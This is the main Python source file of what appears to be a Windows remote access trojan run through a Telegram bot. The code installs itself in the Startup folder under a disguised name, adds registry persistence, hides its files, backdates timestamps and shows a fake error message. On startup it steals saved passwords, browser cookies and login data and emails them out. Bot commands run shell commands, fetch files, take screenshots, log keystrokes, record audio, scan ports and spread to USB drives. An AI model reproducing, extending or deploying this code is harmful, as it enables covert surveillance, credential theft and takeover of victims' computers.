import os
import sys
import time
import errno
import shutil
import ctypes
import pyHook
import urllib
import urllib2
import telepot
import getpass
import logging
import win32api
import win32gui
import datetime
import platform
import threading
import pythoncom
import webbrowser
import subprocess
from Breathe import add_to_registry
from Breathe import ChangeWallpaper
from Breathe import check_external_drive
from Breathe import CookieStealer
from Breathe import DirectoryTree
from Breathe import hideme
from Breathe import httpServer
from Breathe import insertkeystrokes
from Breathe import makeRouterList
from Breathe import modify_file_names
from Breathe import modify_timestamp
from Breathe import portmap
from Breathe import RadiumKeylogger
from Breathe import RecAudio
from Breathe import router_check
from Breathe import SendData
from Breathe import set_email_template
from Breathe import window_title
from Echoes import Run
from PIL import ImageGrab
from uuid import getnode as get_mac

# -----------------------------------------------------------------------------
CHAT_ID = ''  #Get chat id from telegram app
BOTS_ALIVE = []
MAC_ADDRESS = ':'.join(("%012X" % get_mac())[i:i + 2] for i in range(0, 12, 2))
PLAT_FORM = platform.platform()
USER = getpass.getuser()

bot = None
save_keystroke = None
key_logger = ''
info = 'info.txt'
transfer = SendData.EmailData()

buffer = ''
window = ''

SPI_SETDESKWALLPAPER = 20
current_active_window = ''
current_system_time = datetime.datetime.now()

copied_startup_filename = 'AdobePush.py' # The file will be copied to startup folder by this name

access_token = '' # Get access token from botfather in telegram app
FLAGS = ["#START", "#STOP", "#EXECUTE", "#SEND", "#DOWNLOAD", "#UPLOAD", "#SCREENSHOT", "#CMD", "#WALLPAPER", "#HELP", "#SET", "#FIND"]
# -----------------------------------------------------------------------------

threads = 10
emailFlag = 0
server = []

CURR_DIR = os.getcwd()
CURR_FILE_PATH = os.path.realpath(__file__)
CURR_FILE_NAME = os.path.basename(__file__)
SAVE_FILES = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\AppData\Local\CandC'
CACHE_PATH = SAVE_FILES + "\\Cache\\"
USERDATA_PATH = SAVE_FILES + "\\User Data\\"
SERVER_PATH = SAVE_FILES + "\\Server"
PATH_MAIL_TEMP = USERDATA_PATH + "email_template.et"
STARTUP_PATH = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'

help_text='''whoisonline- list active slaves
destroy- delete&clean up
#cmd- execute command on CMD
#download- url (startup, desktop, default)
#execute- shutdown, restart, logoff, lock
#screenshot- take screenshot
#send- passwords, drivetree, driveslist, keystrokes, openwindows
#set- email (0:Default,1:URL,2:Update), filename (0: Itself, 1: Others), keystrokes (text)
#start- website (URL), keylogger, recaudio (time), webserver (Port), spread
#stop- keylogger, webserver
#wallpaper- change wallpaper (URL)
#find- openports (host, threads, ports), router
#help- print this usage'''

def changetTimestamp(folderPath, fileName, dayLimit):
    try:
        modify_timestamp.changeTimestamp(folderPath, fileName, dayLimit)
    except Exception as e:
        print e


def cmdPrompt(command):
    try:
        output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE).communicate()
        output = output[0].replace(" ","")
        bot.sendMessage(CHAT_ID, output)
    except Exception as e:
        print e


def copyFiles(copytodir, stub):
    try:
        filesindir = os.listdir(copytodir)
        coppiedfilename = os.path.basename(sys.argv[0])
        if coppiedfilename not in filesindir:
            try:
                shutil.copy2(stub, copytodir + coppiedfilename)
            except Exception as e:
                print e
    except Exception as e:
        print e
    return True


def copyToStartup():
    try:
        copyfromdir = CURR_DIR + "\\" + CURR_FILE_NAME
        filesindir = os.listdir(STARTUP_PATH)
        if copied_startup_filename not in filesindir:
            try:
                shutil.copy2(copyfromdir, STARTUP_PATH + "\\" + copied_startup_filename)
            except Exception as e:
                print e
    except Exception as e:
        print e

    return True


def download(url, dest):
    try:
        urllib.urlretrieve(url, dest + url.split('/')[-1])
        bot.sendMessage(CHAT_ID, USER + ": File Downloaded <^_^>")
    except Exception as e:
        print e


def driveCheck():
    w = check_external_drive.Notification ()
    win32gui.PumpMessages ()


def execute(command):
    try:
        if command == "shutdown":
            try:
                subprocess.call(["shutdown","/s"])
            except Exception as e:
                print e
        elif command == "logoff":
            try:
                subprocess.call(["shutdown","/l"])
            except Exception as e:
                print e
        elif command == "restart":
            try:
                subprocess.call(["shutdown","/r"])
            except Exception as e:
                print e
        elif command == "lock":
            try:
                ctypes.windll.user32.LockWorkStation()
                bot.sendMessage(CHAT_ID, USER + ' Computer is locked! \ 0.0 /')
            except Exception as e:
                print e
    except Exception as e:
        print e

        
def find(things):
    things = things.split(" ")
    if "openports" in things:
        host = things[things.index("openports")+1:][0]
        threads = int(things[things.index("openports")+2:][0])
        ports = int(things[things.index("openports")+3:][0])
        opThreads = threading.Thread(target = lookPorts, args = (host,threads,ports))
        opThreads.daemon = True
        opThreads.start()
    elif "router" in things:
        routerThreads = threading.Thread(target = lookRouter, args = ())
        routerThreads.daemon = True
        routerThreads.start()

        
def getWindowTitles():
    titles = []
    try:
        windows = window_title.revealWindows()
        for title in windows:
            if len(title) > 0:
                titles.append(title)
        return titles
    except Exception as e:
        print e
        return False


def handle(msg):
    content_type, chat_type, chat_id = telepot.glance(msg)
    if content_type == 'text':
        print '[*] Command: ' + msg['text']
        text_cmd = msg['text'].lower().split(' ')
        usr = USER.replace(" ", "").lower()
        if 'whoisonline' in text_cmd:
            iAmAlive()
        elif 'destroy' in text_cmd:
            killMe()
        elif usr in text_cmd:
            cmd = text_cmd[text_cmd.index(usr) + 1:]
            for flag in FLAGS:
                flag = flag.lower()
                if flag in cmd:
                    command_to_execute = " ".join(text_cmd[text_cmd.index(flag) + 1:])
                    if   flag == "#cmd" :                        
                        cmdPrompt(command_to_execute)
                    elif flag == "#download" :
                        url = text_cmd[text_cmd.index(flag) + 1]
                        dest = text_cmd[text_cmd.index(flag) + 2]
                        if dest == "startup":
                            dest = os.environ.get('HOMEDRIVE') + os.environ.get(
                                'HOMEPATH') + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\'
                        elif dest == "desktop":
                            dest = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\Desktop\\'
                        elif dest == 'default':
                            dest = CACHE_PATH
                        else:
                            dest = os.getenv('TEMP')
                        download(url, dest)
                    elif flag == "#execute" :
                        execute(command_to_execute)
                    elif flag == "#screenshot" :
                        screenshot()
                    elif flag == "#send" :
                        send(command_to_execute)
                    elif flag == "#set" :
                        setStuff(command_to_execute)
                    elif flag == "#start":
                        start(command_to_execute)
                    elif flag == "#stop" :
                        stop(command_to_execute)
                    elif flag == "#wallpaper" :
                        command_to_execute = text_cmd[text_cmd.index(flag) + 1]
                        wallThread = threading.Thread(target=setWallpaper, args=(command_to_execute,))
                        wallThread.daemon = True
                        wallThread.start()
                    elif flag == "#find":
                        find(command_to_execute)
                    elif flag == "#help" :
                        help()


def help():
    bot.sendMessage(CHAT_ID, help_text)


def hide(folderPath):
    hideme.hideFiles(folderPath)


def iAmAlive():
    bot.sendMessage(CHAT_ID, USER + ', ' + MAC_ADDRESS + ' ' + platform.platform() + ": I am online!!")


def insertKeys(message):
    insertkeystrokes.AltTab()
    insertkeystrokes.cursorEnd()
    insertkeystrokes.SendKeystrokes(message)


def internetOn():
    try:
        response = urllib2.urlopen('https://www.google.co.in', timeout=20)
        return True
    except urllib2.URLError as err:
        pass
    return False


def killMe():
    try:
        add_to_registry.deleteRegistery()
        os.remove(sys.argv[0])
        sys.exit(0)
    except Exception as e:
        print e


def lookPorts(host, threads, ports):
    try:
        open_ports = []
        lp = portmap.PortMap()
        open_ports = lp.run(host, threads, ports)
        bot.sendMessage(CHAT_ID, "Open Ports in " + USER + ": " + str(open_ports))
    except Exception as e:
        print e


def lookRouter():
    router = router_check.FindRouter()
    router_name = router.run()
    if router_name != False:
        bot.sendMessage(CHAT_ID, USER + ': %s router found' %(router_name))
    else:
        bot.sendMessage(CHAT_ID, USER + ': Unable to find router')
    

def main():

    global bot
    
    startupThread = threading.Thread(target=startUpWork, args=())
    startupThread.daemon = True
    startupThread.start()
    
    if internetOn():
        try:
            bot = telepot.Bot(access_token)
            bot.message_loop(handle)
            bot.sendMessage(CHAT_ID, str(current_system_time.strftime("%d|%m|%Y-%H|%M|%S")) + ': '+ USER + ' is online ^_^')
            print ('[*] Listening ...')
            try:
                while 1:
                    time.sleep(5)
            except KeyboardInterrupt:
                print '[*] Eclipse completed...'
        except Exception as e:
            pass


def makeFolders():
    try:
        os.makedirs(SAVE_FILES)
        os.makedirs(CACHE_PATH)
        os.makedirs(USERDATA_PATH)
        os.makedirs(SERVER_PATH)
        hide(SAVE_FILES)
    except OSError as exception:
        if exception.errno != errno.EEXIST:
            raise


def persistance():
    try:
        add_to_registry.addRegistery(CURR_FILE_PATH)
    except Exception as e:
        print e


def pollDevice():
    while True:
        if check_external_drive.FLAG == True:
            print "[*] Drive Found: ", check_external_drive.DRIVE+":\\"
            copyFiles(check_external_drive.DRIVE+":\\",os.path.realpath(sys.argv[0]))
            check_external_drive.FLAG = False


def readEmailTemplate(pathEmailTemp):
    email = open(pathEmailTemp,'r')
    return email.readlines()


def rename(renameFlag, folderPath, fileName, newName):
    # renameFlag = 0 for renaming itself
    # renameFlag = 1 for renaming other files
    try:
        if renameFlag == '0':
            modify_file_names.myself(os.path.realpath(__file__), newName)
        elif renameFlag == '1':
            modify_file_names.local_file(folderPath, fileName, newName)
    except Exception as e:
        print e


def screenshot():
    ts = datetime.datetime.now().strftime("%Y%m%d-%H%M%S")
    try:
        scr_img = ImageGrab.grab()
        scr_img.save(str(ts) + '.png')
        bot.sendPhoto(CHAT_ID,open(ts+'.png','rb'),caption="Screenshot from " + USER.upper())
        os.remove(str(ts) + '.png')
    except Exception as e:
        print e
    return True


def send(what):
    global transfer
    if what == "drivetree":
        try:
            DT = DirectoryTree.Directory()
            DT.run()
            transfer.sendData(CACHE_PATH + "DirectoryTree",".txt")
            os.remove(CACHE_PATH + "DirectoryTree.txt")
            bot.sendMessage(CHAT_ID, USER + ": Directory tree sent!! <^_^>")
        except Exception as e:
            print e
    elif what == "driveslist":
        try:
            LD = DirectoryTree.Directory()
            drives = LD.get_list_drives()
            bot.sendMessage(CHAT_ID, USER + " : " + str(drives))
        except Exception as e:
            print e
    elif what == "passwords":
        try:
            passwords = Run.Result()
            open_info = open(CACHE_PATH + info, "a")
            open_info.write(str(passwords.run()) + "\n")
            open_info.close()
            transfer.sendData(CACHE_PATH + "info", ".txt")
            os.remove(CACHE_PATH + "info.txt")
            bot.sendMessage(CHAT_ID, USER + ": Passwords sent!! <^_^>")
        except Exception as e:
            print e
    elif what == "keystrokes":
        try:
            transfer.sendData(USERDATA_PATH + "keylog", ".txt")
            bot.sendMessage(CHAT_ID,USER + ": Keystrokes sent!! <^_^>")
            clear = open(USERDATA_PATH + "keylog.txt","w")
            clear.close()
        except Exception as e:
            print e
    elif what == "openwindows":
        openWindows = getWindowTitles()
        bot.sendMessage(CHAT_ID, USER + " : " + str(openWindows))


def setEmailTemplate(emailFlag, pathEmailTemp, data):
    try:
        if emailFlag == '0':
            set_email_template.setDefaultEmailTemplate(pathEmailTemp)
            bot.sendMessage(CHAT_ID, USER + ": Email template set!!")
        elif emailFlag == '1':
            set_email_template.setEmailTemplate(pathEmailTemp, data)
            bot.sendMessage(CHAT_ID, USER + ": Email template set!!")
        elif emailFlag == '2':
            set_email_template.updateEmailTemplate(pathEmailTemp, data)
            bot.sendMessage(CHAT_ID, USER + ": Email template set!!")
    except Exception as e:
        print e

        
def setStuff(things):
    things = things.split(" ")
    if "email" in things:
        EMAIL_FLAG = str(things[things.index("email")+1:][0])
        if EMAIL_FLAG == '0':
            setEmailTemplate(EMAIL_FLAG, PATH_MAIL_TEMP, None)
        elif EMAIL_FLAG == '1':
            setEmailTemplate(EMAIL_FLAG, PATH_MAIL_TEMP, things[things.index("email")+2:][0])
        elif EMAIL_FLAG == '2':
            setEmailTemplate(EMAIL_FLAG, PATH_MAIL_TEMP, things[things.index("email")+2:][0])
    elif "filename" in things:
        rename_flag = things[things.index("filename")+1:][0]
        new_name = things[things.index("filename")+2:][0]
        try: 
            folder_path = things[things.index("filename")+3:][0]
            file_name = things[things.index("filename")+4:][0]
        except:
            pass
        if rename_flag == '0':
            rename(rename_flag, None, None, new_name)
        elif rename_flag == '1':
            rename(rename_flag, folder_path, file_name, new_name)
    elif "keystrokes" in things :
        keystroke_message = " ".join(things[things.index("keystrokes")+1:])
        keysThreads = threading.Thread(target = insertKeys, args = (keystroke_message,))
        keysThreads.daemon = True
        keysThreads.start()

 
def setWallpaper(imageUrl):
    try:
        wallpaper = ChangeWallpaper.ChangeWallpaper()
        wallpaper.downloadWallpaper(imageUrl)
    except Exception as e:
        print e


def start(service):
    service = service.split(" ")
    try:
        if "keylogger" in service:
            kLog = threading.Thread(target = RadiumKeylogger.hookslaunch)
            kLog.daemon = True
            kLog.start()
            bot.sendMessage(CHAT_ID, "Keylogger deployed in " + USER + " ^_^")
        elif "website" in service:
            webbrowser.open(str(service[service.index("website")+1:][0]))
            bot.sendMessage(CHAT_ID, "Website opened in " + USER + " ^_^")
        elif "recaudio" in service:
            a_rec = RecAudio.RecordAudio()
            rec_time = service[service.index("recaudio")+1:][0]
            a_rec.start(int(rec_time))
            bot.sendAudio(CHAT_ID, open('output.wav', 'rb'), title='Recording from '+USER)
            os.remove('output.wav')
        elif "webserver" in service:
            port = service[service.index("webserver")+1:][0]
            serverThread = threading.Thread(target=startHttpServer, args=(SERVER_PATH, int(port), ))
            serverThread.daemon = True
            serverThread.start()
        elif "spread" in service:
            dChkThread = threading.Thread(target=driveCheck)
            dChkThread.daemon = True
            dChkThread.start()

            pDevcThread = threading.Thread(target=pollDevice)
            pDevcThread.daemon = True
            pDevcThread.start()
    except Exception as e:
        print e


def startHttpServer(serverPath, port):
    global server
    try:
        server = httpServer.SimpleServer()
        server.runServer(serverPath, port)
    except Exception as e:
        print e
        

def startUpWork():
    # To intialise settings for the bot 
    # start certain threads that needs continuous monitoring
    try:
        # Make folders
        makeFolders()
        
        # Add to startup
        startup_files = os.listdir(STARTUP_PATH)
        if copied_startup_filename not in startup_files:
            copyToStartup()
            changetTimestamp(STARTUP_PATH, copied_startup_filename, 777)
            ctypes.windll.user32.MessageBoxA(0, "Error reading file, contents are corrupted.",CURR_FILE_NAME[:-4], 0)
        
        # Add to registry
        persistance()
       
        # Make router list
        makeRouterList.makeRList()
        
        # Extract password, cookies, history and login data
        cache_files = os.listdir(USERDATA_PATH)
        if internetOn:
            if info not in cache_files or "CHL.zip" not in cache_files:
                try:
                    # Passwords
                    passwords = Run.Result()
                    open_info = open(USERDATA_PATH + info, "a")
                    open_info.write(str(passwords.run()) + "\n")
                    open_info.close()
                    
                    # Cookies, History, Login Data
                    chl = CookieStealer.CookieStealer()
                    chl.run()
                    
                    # Change timestamp
                    changetTimestamp(USERDATA_PATH, info, 777)
                    changetTimestamp(USERDATA_PATH, "CHL.zip", 777)
                    
                except Exception as e:
                    print e
                    
                try:
                    print '[*] Sending the files'
                    transfer.sendData(USERDATA_PATH + "info", ".txt")
                    # os.remove(USERDATA_PATH + info)
                    transfer.sendData(USERDATA_PATH + "CHL", ".zip")
                except Exception as e:
                    print e
    except Exception as e:
        print e


def stop(service):
    global server
    service = service.split(" ")
    try:
        if "keylogger" in service:
            send("keystrokes")
            RadiumKeylogger.STOP_FLAG = False
            bot.sendMessage(CHAT_ID, "Keylogger process killed in " + USER + "!")
        elif "webserver" in service:
            server.stopServer()
    except Exception as e:
        print e


def upload():
    pass


if __name__ == '__main__':
    main()
    
